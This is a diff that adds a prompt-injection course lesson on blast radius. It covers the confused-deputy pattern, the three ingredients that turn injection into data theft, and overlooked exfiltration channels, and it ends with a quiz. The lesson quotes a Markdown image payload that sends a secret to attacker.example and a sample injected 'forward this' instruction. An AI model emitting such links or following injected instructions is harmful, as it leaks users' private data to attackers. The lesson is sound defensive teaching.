@@ -1,0 +1,195 @@
+---
+title: "What it can actually do"
+description: "Impact is capability, not cleverness. The three ingredients that turn an injected instruction into a breach, and the exfiltration channels people forget."
+track: practitioner
+module: p3
+order: 4
+minutes: 10
+objectives:
+  - "Rank the risk of a workflow by what the system can do, not by how clever an attack seems"
+  - "Identify the channels through which data can leave, including ones that are not obviously channels"
+concepts: ["blast radius", "capability", "exfiltration", "confused deputy"]
+flashcards:
+  - front: "What determines how bad an injection is?"
+    back: "What the system can do once persuaded. A model that only writes text can only write wrong text; a model with tools can act."
+  - front: "Which three ingredients together make injection a breach?"
+    back: "Access to something private, exposure to text somebody else wrote, and a way to send data outward. Any two are survivable; all three is a channel out."
+  - front: "Name an exfiltration channel that does not look like one."
+    back: "A rendered image URL. The model writes a link with data in the query string, the client fetches it automatically, and the attacker reads their own server logs."
+lastVerified: "2026-09-04"
+contributors: ["core-team"]
+licence: "CC-BY-SA-4.0"
+---
+
+import Quiz from '../../../src/components/Quiz.tsx';
+
+There is a question that sorts these systems into "annoying if it goes wrong"
+and "do not ship this", and it is not about the attack. It is about you.
+
+**Once the model has been persuaded, what can it do?**
+
+An assistant that can only produce text can, at worst, produce wrong text. An
+assistant that can send email can send email. The injection is the same. The
+outcome is not remotely the same, and the difference is entirely in the
+capability you granted.
+
+## The confused deputy
+
+The old name for this pattern is the best one. A *confused deputy* is a program
+acting with authority on someone's behalf that gets talked into using that
+authority for someone else.
+
+Your assistant is a deputy. You gave it your credentials, your database
+connection, your mailbox. It does not have opinions about who it is helping — it
+has a context window, and whatever is in it.
+
+That framing kills a tempting line of thinking early. The question is never "how
+would an attacker get access to the database?" The attacker does not need access
+to the database. **You already gave it to the deputy.** The attacker needs the
+deputy to ask on their behalf, and the deputy reads text they can write.
+
+## The three ingredients
+
+A useful way to look at any workflow is to check for three things. Individually
+they are ordinary. Together they are a channel out.
+
+> **1. Access to something private.** Customer records, internal documents, the
+> user's files, a mailbox, credentials.
+>
+> **2. Exposure to text someone else wrote.** Anything from L3's carrier list.
+>
+> **3. A way to send data outward.** A tool that posts, an email, a webhook — or
+> anything that causes a fetch to a URL the attacker chooses.
+
+Any two are usually survivable. A system with private data and outbound
+capability, reading only text you control, is an ordinary application. A system
+reading hostile text with no private data and no outbound path can be made to
+say something wrong, which is a content problem.
+
+All three, and the injected instruction has everything it needs: read the
+private thing, put it in the outbound thing, done. No exploit, no memory
+corruption, no privilege escalation. Just a deputy following instructions.
+
+When you audit a workflow, look for all three in one place. That is the fastest
+triage available.
+
+## Exfiltration channels people forget
+
+Ingredient three is the one that gets underestimated, because people picture an
+explicit "send email" tool and conclude they do not have one.
+
+**Rendered images.** The model writes `![](https://attacker.example/x?d=SECRET)`.
+Your chat interface renders Markdown, so the browser fetches that URL without
+anyone clicking. The data is in the attacker's access log. This is the classic
+one, and it is quiet.
+
+**Links a user will plausibly click.** Less automatic, more reliable than you
+would like, especially when the link is presented as *"click here for the full
+report"*.
+
+**Any tool with a URL parameter.** A fetch tool, a webhook, a "check this link"
+utility. It does not have to be named `send_data` to send data.
+
+**Search queries.** A tool that searches an external service transmits its query
+to that service. The query is chosen by the model.
+
+**The answer itself.** If a human reads the output and acts on it, the human is
+the channel. A summary that says *"forward this to accounts@attacker.example"*
+does not need any tool at all.
+
+**Error messages and logs.** If your logging captures model output and somebody
+else can read those logs, that is a slower channel with the same destination.
+
+The general form: **anything that turns model output into a network request, or
+into a human action, is an outbound path.** Enumerate on that basis, not on
+which functions have alarming names.
+
+## Rank your own workflow
+
+For each thing your system can do, ask three questions and write down the
+answers:
+
+1. **Is it reversible?** Reading a file, yes. Deleting one, no. Sending an
+   email, definitely not.
+2. **Who notices?** A wrong answer on screen is seen immediately. A row quietly
+   written to a table is not.
+3. **What is the worst single call?** Not a chain of ten steps — one call, with
+   the worst arguments an attacker could choose.
+
+That third question is the useful one, because the mitigations in L6 mostly work
+by making the worst single call less bad.
+
+## Where Lrnon sits
+
+Worth being concrete, because it is a live example of the triage above.
+
+`/api/sky` reads a retrieval index and calls one model. It holds a service
+credential for the database, which is used for exactly one thing: incrementing a
+spend counter. It cannot read learner records, cannot write content, cannot
+send anything, and has no fetch tool.
+
+Run the three ingredients against it:
+
+- **Private data?** Barely — the index is public lesson text, published on the
+  site.
+- **Untrusted input?** Potentially, per L3.
+- **Outbound path?** The answer text, which reaches one person who asked a
+  question.
+
+Two of three, weakly. The worst available outcome is a wrong answer carrying a
+citation, which the citation check makes visible rather than silent.
+
+That is not because anybody was clever. It is because the assistant was never
+given anything else to do — and if a future version gains a tool, this analysis
+has to be redone before that ships, not after.
+
+## Try it now (8 minutes)
+
+List every action your system can take. For each, write the worst single call an
+attacker could produce, assuming they fully control the arguments.
+
+Then sort the list by "how long until a human would notice". The top of that
+list — irreversible and unnoticed — is where your attention belongs, regardless
+of how unlikely the attack path looks.
+
+<Quiz client:visible items={[
+  {
+    q: "Which combination turns an injected instruction into a data breach?",
+    options: [
+      "A long system prompt, an untrusted document, and a capable model",
+      "Access to private data, exposure to text someone else wrote, and a way to send data outward",
+      "An unauthenticated endpoint, a public index, and a fetch tool"
+    ],
+    answer: 1,
+    explain: "Any two of the three are usually survivable. All three in one place means the injected instruction can read the private thing and put it into the outbound thing."
+  },
+  {
+    q: "Your assistant has no send or post tool, but its answers render Markdown in the browser. Is there an outbound path?",
+    options: [
+      "No — without a sending tool nothing can leave",
+      "Yes — a rendered image URL causes the browser to fetch it automatically, putting data in the attacker's logs",
+      "Only if the user clicks a link"
+    ],
+    answer: 1,
+    explain: "Rendered images are fetched without any click. Anything that turns model output into a network request is an outbound path, whatever the function is called."
+  },
+  {
+    q: "Why is 'confused deputy' the right frame for this?",
+    options: [
+      "The model becomes confused about which model it is",
+      "The attacker needs no access of their own — you already gave the deputy authority, and they only need it to act on their behalf",
+      "It describes models that were fine-tuned on conflicting data"
+    ],
+    answer: 1,
+    explain: "The credentials are already granted. Nothing needs to be broken into; the deputy simply reads instructions from someone who is not you."
+  }
+]} />
+
+## Recap
+
+Impact is capability. Look for three ingredients together — private access,
+untrusted text, an outbound path — because that combination is what converts a
+wrong answer into a breach. Enumerate outbound paths by asking what turns model
+output into a network request or a human action, which catches rendered images
+and search queries as well as anything named "send". Then rank your actions by
+reversibility and by how long a person would take to notice.
